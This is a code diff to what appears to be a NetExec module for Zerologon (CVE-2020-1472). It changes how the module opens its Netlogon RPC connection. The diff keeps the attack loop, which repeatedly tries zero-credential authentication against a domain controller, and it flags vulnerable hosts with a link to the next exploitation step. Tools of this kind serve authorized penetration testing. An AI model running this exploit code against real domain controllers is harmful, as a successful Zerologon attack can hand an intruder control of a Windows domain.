@@ -1,10 +1,11 @@
 # everything is comming from https://github.com/dirkjanm/CVE-2020-1472
 # credit to @dirkjanm
 # module by : @mpgn_x64
-from impacket.dcerpc.v5 import nrpc, epm, transport
+from impacket.dcerpc.v5 import nrpc, epm
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 import sys
 from nxc.helpers.misc import CATEGORY
+from nxc.helpers.rpc import NXCRPCConnection
 from nxc.logger import nxc_logger
 
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
@@ -26,7 +27,7 @@ class NXCModule:
 
     def on_login(self, context, connection):
         self.context = context
-        if self.perform_attack("\\\\" + connection.hostname, connection.host, connection.hostname, connection.host):
+        if self.perform_attack(connection, "\\\\" + connection.hostname, connection.host, connection.hostname, connection.host):
             self.context.log.highlight("VULNERABLE")
             self.context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
             try:
@@ -43,17 +44,20 @@ class NXCModule:
             except Exception:
                 self.context.log.debug("Error updating zerologon status in database")
 
-    def perform_attack(self, dc_handle, dc_ip, target_computer, remoteHost):
+    def perform_attack(self, connection, dc_handle, dc_ip, target_computer, remoteHost):
         # Keep authenticating until successful. Expected average number of attempts needed: 256.
         self.context.log.debug("Performing authentication attempts...")
         rpc_con = None
         try:
             binding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
-            rpc_con_ = transport.DCERPCTransportFactory(binding.replace(remoteHost, dc_ip))
-            rpc_con_.setRemoteHost(remoteHost)
-            rpc_con = rpc_con_.get_dce_rpc()
-            rpc_con.connect()
-            rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
+            string_binding = binding.replace(remoteHost, dc_ip)
+            rpc_con = NXCRPCConnection(connection).connect(
+                None,
+                nrpc.MSRPC_UUID_NRPC,
+                string_binding=string_binding,
+                set_remote_host=remoteHost,
+                anonymous_rpc=True,
+            )
             for _attempt in range(MAX_ATTEMPTS):
                 result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                 if result:
